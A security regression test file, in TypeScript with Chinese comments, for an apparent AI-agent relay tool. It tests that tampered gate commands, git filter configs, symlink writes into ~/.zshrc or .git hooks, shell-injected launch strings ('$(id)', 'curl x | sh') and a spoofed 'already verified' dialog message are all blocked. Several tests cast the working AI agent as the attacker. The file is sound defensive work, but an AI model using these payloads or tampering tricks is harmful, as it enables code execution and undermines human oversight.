import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

/**
 * 2026-10-02 安全审计里复现过的攻击，复核后改成的反例：
 * 项目里被改过的检查命令不自动跑、快照仓库的 config 和 .gitattributes 不能让 git 执行命令、
 * 快照仓库 HEAD 写坏了自己指回去、账本里形状不对的事件不采信、桌面程序的打开命令只认 open -a。
 * 威胁从哪来：项目文件夹里的东西——克隆来的仓库、「只在项目里」的 AI 都改得到 .relay。
 */

// 这个文件里的测试不碰你真实的家目录（接力台的数据）。
const HOME = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'relay-security-home-')));
process.env.HOME = HOME;
process.env.RELAY_HOME = path.join(HOME, '.relay');
process.env.RELAY_SCAN_APPS = 'off';
process.env.RELAY_LOGIN_PATH = 'off';
process.env.RELAY_AUTODETECT = 'off';
fs.mkdirSync(process.env.RELAY_HOME, { recursive: true });

/* eslint-disable @typescript-eslint/no-require-imports */
const config = require('../src/core/config') as typeof import('../src/core/config');
const ledger = require('../src/core/ledger') as typeof import('../src/core/ledger');
const notes = require('../src/core/notes') as typeof import('../src/core/notes');
const registry = require('../src/core/registry') as typeof import('../src/core/registry');
const snap = require('../src/core/snap') as typeof import('../src/core/snap');
const init = require('../src/ops/init') as typeof import('../src/ops/init');
const track = require('../src/ops/track') as typeof import('../src/ops/track');
/* eslint-enable @typescript-eslint/no-require-imports */

const GATE_OK = path.join(process.env.RELAY_HOME, 'gate-ok.json');

function tmpDir(name: string): string {
  return fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), `relay-${name}-`)));
}

function project(name: string): { root: string; write: (rel: string, text: string) => void } {
  const root = tmpDir(name);
  fs.writeFileSync(path.join(root, 'README.md'), 'demo\n');
  init.initProject(root);
  notes.setTask(root, '写一个 a.txt', []);
  const write = (rel: string, text: string) => {
    fs.mkdirSync(path.dirname(path.join(root, rel)), { recursive: true });
    fs.writeFileSync(path.join(root, rel), text);
  };
  return { root, write };
}

const handoff = `# 交接：Codex · gpt-6-astra\n\n- 工具：Codex\n- 模型：gpt-6-astra\n- 状态：已交接\n\n## 做了什么\n\n- 改了文件\n`;
fs.writeFileSync(
  path.join(process.env.RELAY_HOME, 'agents.json'),
  JSON.stringify({ agents: [{ name: 'codex', label: 'Codex', kind: 'cli', cmd: 'codex', tier: 'strong', model: 'gpt-6-astra', harness: 'codex' }] })
);

test('检查命令：项目里写进来的（克隆来的、正在干活的 AI 改的）不自动跑；设置里保存过的才跑，之后再被改又不跑', async () => {
  const { root, write } = project('gate-confirm');
  config.ensureGateOk(); // 接力台启动：这时项目里还没有检查命令
  const mark = path.join(tmpDir('gate-mark'), 'ran');
  const evil = { gate: { command: `touch ${mark}` }, protectedPaths: [] };
  write('.relay/config.json', JSON.stringify(evil));
  write('.relay/交接/第1棒-1002-2200-codex.md', handoff);
  write('a.txt', '1\n');
  await track.trackAndGate(root);
  const stint = (id: number) => ledger.loadLedger(root).stints.find((s) => s.id === id)!;
  assert.equal(fs.existsSync(mark), false, '以前这里检查命令在对账后直接就跑了');
  assert.equal(stint(1).gate?.status, 'error');
  assert.equal(stint(1).gate?.detail, config.GATE_UNCONFIRMED);

  // 网页「设置 → 项目」保存（人看过）：跑
  config.saveRelayConfig(root, evil);
  write('.relay/交接/第2棒-1002-2210-codex.md', handoff);
  write('b.txt', '2\n');
  await track.trackAndGate(root);
  assert.equal(stint(2).gate?.status, 'pass');
  assert.ok(fs.existsSync(mark));

  // 之后项目里的配置又被改了：不跑
  fs.rmSync(mark);
  write('.relay/config.json', JSON.stringify({ gate: { command: `touch ${mark} && true` }, protectedPaths: [] }));
  write('.relay/交接/第3棒-1002-2220-codex.md', handoff);
  write('c.txt', '3\n');
  await track.trackAndGate(root);
  assert.equal(stint(3).gate?.status, 'error');
  assert.equal(fs.existsSync(mark), false);
});

test('检查命令：升级上来第一次运行时，最近打开过、接入过的项目现有的检查命令算确认过；没打开过的（克隆来的）不算', () => {
  fs.rmSync(GATE_OK, { force: true });
  const { root: known, write } = project('gate-known'); // 接入时记进了最近打开的项目
  write('.relay/config.json', JSON.stringify({ gate: { command: 'npm test' }, protectedPaths: [] }));
  const cloned = tmpDir('gate-cloned');
  fs.mkdirSync(path.join(cloned, '.relay'));
  fs.writeFileSync(path.join(cloned, '.relay', 'config.json'), JSON.stringify({ gate: { command: 'npm test' }, protectedPaths: [] }));
  config.ensureGateOk();
  assert.equal(config.gateConfirmed(known, 'npm test'), true);
  assert.equal(config.gateConfirmed(cloned, 'npm test'), false);
  assert.equal(config.gateConfirmed(known, 'npm test; curl x | sh'), false, '改过就不算');
  assert.equal(config.gateConfirmed(cloned, ''), true, '没配检查命令：不用跑');
});

test('快照仓库：config 里加了 filter、textconv，项目里放 .gitattributes，存快照、看改动、退回都不执行；HEAD 写坏了指回原来的分支，以前的快照都在', () => {
  const { root, write } = project('snap-filter');
  const s1 = snap.takeSnapshot(root, '一');
  const mark = path.join(tmpDir('snap-mark'), 'ran');
  const cfg = path.join(root, '.relay', 'snapshots', 'config');
  fs.appendFileSync(cfg, `[filter "x"]\n\tclean = touch ${mark}; cat\n\tsmudge = touch ${mark}; cat\n[diff "x"]\n\ttextconv = touch ${mark}; cat\n[include]\n\tpath = /tmp/nowhere\n`);
  write('.gitattributes', '* filter=x diff=x\n');
  write('a.txt', '1\n');
  const s2 = snap.takeSnapshot(root, '二');
  assert.equal(s2.changed, true);
  snap.snapDiff(root, s1.sha, s2.sha);
  snap.restoreSnapshot(root, s1.sha);
  assert.equal(fs.existsSync(mark), false, '以前 git add 时 filter 就执行了');
  assert.doesNotMatch(fs.readFileSync(cfg, 'utf8'), /filter|textconv|include/);
  assert.match(fs.readFileSync(cfg, 'utf8'), /bare = true/, 'git 建库时写的那几项还在');

  fs.writeFileSync(path.join(root, '.relay', 'snapshots', 'HEAD'), 'garbage\n');
  write('b.txt', '2\n');
  const s3 = snap.takeSnapshot(root, '三');
  assert.equal(s3.changed, true, '以前 HEAD 写坏以后快照一直报错');
  assert.ok(snap.snapExists(root, s1.sha) && snap.snapExists(root, s2.sha), '以前的快照都还在（不是挪走重建）');
});

test('账本：形状不对的事件不采信（2^53 的棒号、不像快照号的退回和起点），不会开出一棒永远「进行中」', () => {
  const T = '2026-10-02T13:00:00.000Z';
  const v = ledger.viewLedger([
    { type: 'init', ts: T, snap: 'S0' },
    { type: 'stint', ts: T, stint: { id: 2 ** 53, status: 'working', startedAt: T } },
    { type: 'rollback', ts: T, to: 'S0', label: '第 1 棒之前', safety: 'X', after: '$(id)', dropped: [] },
    { type: 'base', ts: T, snap: '../../x' },
  ] as never);
  assert.equal(v.stints.length, 0);
  assert.equal(v.open, null);
  assert.equal(v.base, 'S0');
  assert.equal(v.lastRollback, null);
});

test('桌面程序的打开命令只认 open -a 程序 {{dir}}：带 shell 写法的保存时就拦下', () => {
  for (const ok of ['open -a Cursor {{dir}}', 'open -a "Xiaomi MiMo" {{worktree}}', 'open -a Claude "{{dir}}"', 'open -a 微信 {{dir}}']) assert.equal(registry.isOpenCommand(ok), true, ok);
  for (const bad of ['touch /tmp/x # {{dir}}', 'open -a Cursor {{dir}}; id', 'open -a "$(id)" {{dir}}', 'open -a `id` {{dir}}', 'echo $(id) {{dir}}', 'cursor {{dir}}', 'open -a Cursor {{dir}} | sh']) {
    assert.equal(registry.isOpenCommand(bad), false, bad);
  }
  assert.throws(() => registry.normalizeAgent({ name: 'evil', kind: 'app', tier: 'weak', cmd: 'touch /tmp/x # {{dir}}' }), /open -a/);
  assert.throws(() => registry.normalizeAgent({ name: 'c', kind: 'cli', tier: 'weak', cmd: 'codex', app: 'open -a X {{dir}}; id' }), /open -a/);
  // 命令行成员的启动命令不经过 shell：Windows 路径里的反斜杠照样能存（「再加一位」会照抄它）
  assert.equal(registry.normalizeAgent({ name: 'w', kind: 'cli', tier: 'weak', cmd: 'C:\\Users\\me\\claude.exe' }).cmd, 'C:\\Users\\me\\claude.exe');
});

// ---- 2026-10-03 第二轮（GLM-5.3 红蓝对抗）复核后的反例 ----

test('账本：塞一棒 2^53-1 的假棒号，下一棒照常编成 2（以前编到安全整数外面，写进去的棒从此看不见）；一行几十 MB 的当坏行不解析', () => {
  const { root } = project('stint-gap');
  const T = '2026-10-03T12:00:00.000Z';
  const head = ledger.loadLedger(root).init!.snap;
  const lines = [
    { type: 'stint', ts: T, stint: { id: 1, kind: 'work', status: 'handed', startedAt: T, endedAt: T, from: head, to: head } },
    { type: 'stint', ts: T, stint: { id: Number.MAX_SAFE_INTEGER, kind: 'work', status: 'handed', startedAt: T, endedAt: T, from: head, to: head } },
  ];
  const jp = path.join(root, '.relay', 'journal.jsonl');
  fs.appendFileSync(jp, lines.map((l) => JSON.stringify(l)).join('\n') + '\n');
  const v = ledger.loadLedger(root);
  assert.deepEqual(v.stints.map((s) => s.id), [1], '跳得离谱的棒号不采信');
  assert.equal(ledger.nextStintId(v), 2);

  fs.appendFileSync(jp, JSON.stringify({ type: 'base', ts: T, snap: head, pad: 'x'.repeat(600 * 1024) }) + '\n');
  const full = ledger.readLedgerFull(root);
  assert.equal(full.bad.length, 1, '超长的一行记成坏行');
  assert.equal(full.bad[0].text.length, 120);
});

test('桌面程序的打开命令：程序名不许带路径（open -a /某处/evil.app 能拉起随便丢在哪儿的程序包）；成员名单大得离谱当坏了', () => {
  for (const bad of ['open -a /tmp/evil.app {{dir}}', 'open -a "/tmp/evil.app" {{dir}}', "open -a '/tmp/evil.app' {{dir}}", 'open -a ../evil {{dir}}']) {
    assert.equal(registry.isOpenCommand(bad), false, bad);
  }
  assert.equal(registry.isOpenCommand('open -a "DeepSeek Harness" {{dir}}'), true);
  const p = registry.registryPath();
  const keep = fs.readFileSync(p, 'utf8');
  try {
    const agents = Array.from({ length: 6000 }, (_, i) => ({ name: `m${i}`, label: `M${i}`, kind: 'cli', cmd: 'codex', tier: 'weak', harness: 'codex' }));
    fs.writeFileSync(p, JSON.stringify({ agents }));
    assert.throws(() => registry.loadRegistry(), (e: { code?: string }) => e.code === 'bad-registry');
  } finally {
    fs.writeFileSync(p, keep);
  }
  assert.equal(registry.loadRegistry().agents.length, 1, '换回正常的名单又能读');
});

test('快照仓库：config 里写上 sha256、换掉存法，或者 HEAD 换成文件夹，下次用之前自己理回来，以前的快照都在', () => {
  const { root, write } = project('snap-values');
  const s1 = snap.takeSnapshot(root, '一');
  const dir = path.join(root, '.relay', 'snapshots');
  fs.writeFileSync(path.join(dir, 'config'), '[core]\n\trepositoryformatversion = 1\n\tfilemode = true\n\tbare = false\n[extensions]\n\tobjectformat = sha256\n\trefstorage = reftable\n');
  write('a.txt', '1\n');
  const s2 = snap.takeSnapshot(root, '二');
  assert.equal(s2.changed, true, '以前 sha256 留在 config 里，git 认不出这个仓库');
  assert.doesNotMatch(fs.readFileSync(path.join(dir, 'config'), 'utf8'), /sha256|reftable|bare = false/);

  fs.rmSync(path.join(dir, 'HEAD'));
  fs.mkdirSync(path.join(dir, 'HEAD'));
  write('b.txt', '2\n');
  const s3 = snap.takeSnapshot(root, '三');
  assert.equal(s3.changed, true, '以前 HEAD 是文件夹时一直报「不是 git 仓库」');
  assert.ok(fs.statSync(path.join(dir, 'HEAD')).isFile());
  assert.ok(fs.readdirSync(dir).some((f) => f.startsWith('HEAD.broken-')), '那个文件夹挪到一边，不删');
  assert.ok(snap.snapExists(root, s1.sha) && snap.snapExists(root, s2.sha));
});

test('网页接口认的文件夹：接入过的、最近的、打开过的（同一个文件夹换种写法也认）；别的不认', () => {
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const memory = require('../src/core/memory') as typeof import('../src/core/memory');
  const { root } = project('known-proj');
  const other = tmpDir('known-other');
  assert.equal(memory.knownDir(root), true, '接入过的项目');
  assert.equal(memory.knownDir(other), false);
  assert.equal(memory.knownDir(other, other), true, '这个接力台启动时给的那个');
  memory.rememberOpened(other);
  const link = path.join(tmpDir('known-link'), 'to-other');
  fs.symlinkSync(other, link);
  assert.equal(memory.knownDir(link), true, '经过链接的写法认成同一个');
  memory.rememberProject(root);
  assert.deepEqual(memory.loadMemory().opened, [other], '记最近的项目不会把打开过的冲掉');
  memory.forgetProject(other);
  assert.equal(memory.knownDir(other), false);
});

test('上次打开的项目没了（删了、挪走了）：换成最近打开过、还在的那一个；都没了是 null', () => {
  // 2026-10-05 删掉试跑记录后，网页和后台都还停在已经不在的「界面实测」上
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const memory = require('../src/core/memory') as typeof import('../src/core/memory');
  const a = tmpDir('last-a'), b = tmpDir('last-b');
  memory.rememberProject(b);
  memory.rememberProject(a);
  assert.equal(memory.lastProject(), a);
  fs.rmSync(a, { recursive: true, force: true });
  assert.equal(memory.lastProject(), b, '上次那个没了，换成还在的');
  fs.rmSync(b, { recursive: true, force: true });
  const left = (memory.loadMemory().recents ?? []).filter((r) => fs.existsSync(r));
  assert.equal(memory.lastProject(), left[0] ?? null);
});

test('往 .relay 里写：仓库里预先放好的链接（文件或文件夹）不跟着写，家目录里的文件不会被换掉', () => {
  // 2026-10-07 安全审查：.relay/复核/第1棒.diff 这种猜得到的名字做成指向 ~/.zshrc 的链接，
  // 复核用的改动文件会把它整个换成 diff，diff 里以空格开头的一行就是下次开终端要执行的命令。
  const { root } = project('link-write');
  init.initProject(root);
  const victim = path.join(tmpDir('link-victim'), 'zshrc');
  fs.writeFileSync(victim, '原来的内容\n');
  const diff = path.join(root, notes.reviewDiffFileFor(1));
  fs.mkdirSync(path.dirname(diff), { recursive: true });
  fs.symlinkSync(victim, diff);
  assert.throws(() => track.writeReviewDiff(root, { id: 1, from: 'a'.repeat(40), to: 'b'.repeat(40), who: { label: 'x' } } as never), /链接/);
  assert.equal(fs.readFileSync(victim, 'utf8'), '原来的内容\n');

  // 账本：追加也不跟着链接
  const outside = tmpDir('link-dir');
  fs.writeFileSync(path.join(outside, 'journal.jsonl'), '');
  const lp = ledger.ledgerPath(root);
  fs.rmSync(lp, { force: true });
  fs.symlinkSync(path.join(outside, 'journal.jsonl'), lp);
  assert.throws(() => ledger.appendLedger(root, { type: 'note', ts: new Date().toISOString(), text: 'x' } as never), /链接/);
  assert.equal(fs.readFileSync(path.join(outside, 'journal.jsonl'), 'utf8'), '');

  // 整个文件夹是链接：交接文件夹指到外面，代写交接不写过去
  const hd = path.join(root, notes.HANDOFF_DIR);
  fs.rmSync(hd, { recursive: true, force: true });
  fs.symlinkSync(outside, hd);
  assert.throws(() => track.writeGhostHandoff(root, { id: 2, who: { label: 'x', tool: 'codex' }, facts: null } as never), /链接/);
  assert.deepEqual(fs.readdirSync(outside), ['journal.jsonl']);

  // AGENTS.md 是链接：写规矩时不改到链接指的文件
  const agents = path.join(root, 'AGENTS.md');
  fs.rmSync(agents, { force: true });
  fs.symlinkSync(victim, agents);
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const protocol = require('../src/core/protocol') as typeof import('../src/core/protocol');
  assert.throws(() => protocol.upsertBlock(agents), /链接/);
  assert.equal(fs.readFileSync(victim, 'utf8'), '原来的内容\n');
});

test('往项目里写：链接指到项目里面的照常写（AGENTS.md 指向 CLAUDE.md 能接入）；指到 .git、断了的不写', () => {
  // 2026-10-07 复查：2.0.10 只要路上有链接就不写，AGENTS.md 指向 CLAUDE.md 的项目接入直接失败
  const root = tmpDir('link-inside');
  fs.writeFileSync(path.join(root, 'CLAUDE.md'), '# 项目规矩\n');
  fs.symlinkSync('CLAUDE.md', path.join(root, 'AGENTS.md'));
  init.initProject(root);
  assert.ok(fs.lstatSync(path.join(root, 'AGENTS.md')).isSymbolicLink(), 'AGENTS.md 还是链接');
  const claude = fs.readFileSync(path.join(root, 'CLAUDE.md'), 'utf8');
  assert.ok(claude.startsWith('# 项目规矩\n') && claude.includes('接力'), '规矩写进了链接指的 CLAUDE.md');

  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const sw = require('../src/core/safe-write') as typeof import('../src/core/safe-write');
  // 交接文件夹指到项目里另一个文件夹：照常写进去
  fs.mkdirSync(path.join(root, 'docs', 'handoffs'), { recursive: true });
  const hd = path.join(root, notes.HANDOFF_DIR);
  fs.rmSync(hd, { recursive: true, force: true });
  fs.symlinkSync(path.join(root, 'docs', 'handoffs'), hd);
  sw.writeProjectFile(path.join(hd, 'a.md'), 'x', root);
  assert.equal(fs.readFileSync(path.join(root, 'docs', 'handoffs', 'a.md'), 'utf8'), 'x');

  // 指到 .git 里（钩子、配置）：不写
  fs.mkdirSync(path.join(root, '.git', 'hooks'), { recursive: true });
  fs.writeFileSync(path.join(root, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\n');
  const diff = path.join(root, notes.reviewDiffFileFor(3));
  fs.mkdirSync(path.dirname(diff), { recursive: true });
  fs.symlinkSync(path.join(root, '.git', 'hooks', 'pre-commit'), diff);
  assert.throws(() => sw.writeProjectFile(diff, 'curl x | sh', root), /\.git/);
  assert.equal(fs.readFileSync(path.join(root, '.git', 'hooks', 'pre-commit'), 'utf8'), '#!/bin/sh\n');
  // 断了的链接：不写（不顺着建出新文件）
  const dangling = path.join(root, notes.reviewDiffFileFor(4));
  fs.symlinkSync(path.join(tmpDir('gone'), 'nope', 'x'), dangling);
  assert.throws(() => sw.writeProjectFile(dangling, 'x', root), /断了/);
});

test('往项目里写：查过之后、打开之前路上的文件夹被换成链接，也不写到外面（外面的文件不被清空）', () => {
  const { root } = project('link-race');
  init.initProject(root);
  const victim = path.join(tmpDir('race-victim'), 'x.log');
  fs.writeFileSync(victim, '原来的内容\n');
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const sw = require('../src/core/safe-write') as typeof import('../src/core/safe-write');
  const dir = path.join(root, '.relay', 'runs-race');
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'x.log'), '');
  // 模拟正在干活的 AI 卡准空档：检查完、打开前，把文件夹换成指到外面的链接
  const open = fs.openSync;
  (fs as { openSync: typeof fs.openSync }).openSync = ((...args: Parameters<typeof fs.openSync>) => {
    if (String(args[0]) === path.join(dir, 'x.log')) {
      fs.rmSync(dir, { recursive: true, force: true });
      fs.symlinkSync(path.dirname(victim), dir);
    }
    return open(...args);
  }) as typeof fs.openSync;
  try {
    assert.throws(() => sw.writeProjectFile(path.join(dir, 'x.log'), 'curl x | sh\n', root), /链接/);
  } finally {
    (fs as { openSync: typeof fs.openSync }).openSync = open;
  }
  assert.equal(fs.readFileSync(victim, 'utf8'), '原来的内容\n');

  // 换过去、打开、又换回来（再查一遍路上看不出链接）：靠核对打开的是不是项目里那个文件拦住
  fs.rmSync(dir, { force: true });
  fs.mkdirSync(dir);
  fs.writeFileSync(path.join(dir, 'x.log'), '');
  (fs as { openSync: typeof fs.openSync }).openSync = ((...args: Parameters<typeof fs.openSync>) => {
    if (String(args[0]) !== path.join(dir, 'x.log')) return open(...args);
    fs.rmSync(dir, { recursive: true, force: true });
    fs.symlinkSync(path.dirname(victim), dir);
    const fd = open(...args);
    fs.rmSync(dir, { force: true });
    fs.mkdirSync(dir);
    fs.writeFileSync(path.join(dir, 'x.log'), '');
    return fd;
  }) as typeof fs.openSync;
  try {
    assert.throws(() => sw.appendProjectFile(path.join(dir, 'x.log'), 'curl x | sh\n', root), /链接/);
  } finally {
    (fs as { openSync: typeof fs.openSync }).openSync = open;
  }
  assert.equal(fs.readFileSync(victim, 'utf8'), '原来的内容\n');
});

test('同时做几步并回项目：先全部查一遍，有一个要写到项目外面就一个都不搬；删掉的链接只删链接本身', () => {
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const parallel = require('../src/ops/parallel') as typeof import('../src/ops/parallel');
  const root = tmpDir('apply-link');
  const copy = tmpDir('apply-copy');
  const outside = tmpDir('apply-outside');
  fs.writeFileSync(path.join(copy, 'a.txt'), 'new a');
  fs.mkdirSync(path.join(copy, 'out'));
  fs.writeFileSync(path.join(copy, 'out', 'b.txt'), 'new b');
  fs.symlinkSync(outside, path.join(root, 'out'));
  assert.throws(() => parallel.applyFiles(root, copy, [{ path: 'a.txt', deleted: false }, { path: 'out/b.txt', deleted: false }]), /链接/);
  assert.ok(!fs.existsSync(path.join(root, 'a.txt')), '前面的 a.txt 也没搬');
  assert.deepEqual(fs.readdirSync(outside), []);

  // 项目里指向项目内文件夹的链接：照常搬进去
  fs.mkdirSync(path.join(root, 'libs', 'shared'), { recursive: true });
  fs.symlinkSync(path.join(root, 'libs', 'shared'), path.join(root, 'shared'));
  fs.mkdirSync(path.join(copy, 'shared'));
  fs.writeFileSync(path.join(copy, 'shared', 'c.txt'), 'new c');
  parallel.applyFiles(root, copy, [{ path: 'a.txt', deleted: false }, { path: 'shared/c.txt', deleted: false }]);
  assert.equal(fs.readFileSync(path.join(root, 'libs', 'shared', 'c.txt'), 'utf8'), 'new c');

  // CLAUDE.md 是指向 AGENTS.md 的链接、副本里删了它：删的是链接，AGENTS.md 还在
  fs.writeFileSync(path.join(root, 'AGENTS.md'), '规矩\n');
  fs.symlinkSync('AGENTS.md', path.join(root, 'CLAUDE.md'));
  parallel.applyFiles(root, copy, [{ path: 'CLAUDE.md', deleted: true }]);
  assert.ok(!fs.existsSync(path.join(root, 'CLAUDE.md')) && fs.readFileSync(path.join(root, 'AGENTS.md'), 'utf8') === '规矩\n');
});

test('系统确认框：命令里的换行不能在框里另起几行；一次只弹一个；点了取消一分钟内不再弹', async () => {
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const confirm = require('../src/core/confirm') as typeof import('../src/core/confirm');
  assert.equal(confirm.shownValue('sh -c x\n\n（接力台已核对，可以放心允许）'), 'sh -c x ⏎  ⏎ （接力台已核对，可以放心允许）');
  assert.equal(confirm.shownValue('a\u202Eb\tc'), 'a b c');
  assert.ok(confirm.shownValue('x'.repeat(400)).endsWith('…（共 400 个字）'));

  const seen: string[] = [];
  const answer: ((ok: boolean) => void)[] = [];
  confirm.setDialogForTest((text) => {
    seen.push(text);
    return new Promise<boolean>((r) => answer.push(r));
  });
  // 又弹了一个框、在等人点：别让测试一直挂着
  const soon = (p: Promise<void>) => Promise.race([p, new Promise<void>((_r, no) => setTimeout(() => no(new Error('又弹了一个框')), 500))]);
  try {
    const first = confirm.mustAllow('改成员「a」？');
    await assert.rejects(soon(confirm.mustAllow('改成员「b」？')), /在等你点/);
    assert.equal(seen.length, 1, '第二个没弹');
    assert.ok(seen[0].endsWith('不是你刚在接力台里改的，点「取消」。'), '框里带着提醒');
    answer[0](true);
    await first;

    const second = confirm.mustAllow('改成员「c」？');
    answer[1](false);
    await assert.rejects(second, /没有允许/);
    await assert.rejects(soon(confirm.mustAllow('改成员「d」？')), /一分钟内不再弹框/);
    assert.equal(seen.length, 2, '取消之后不再弹');
  } finally {
    confirm.setDialogForTest(null);
  }
});
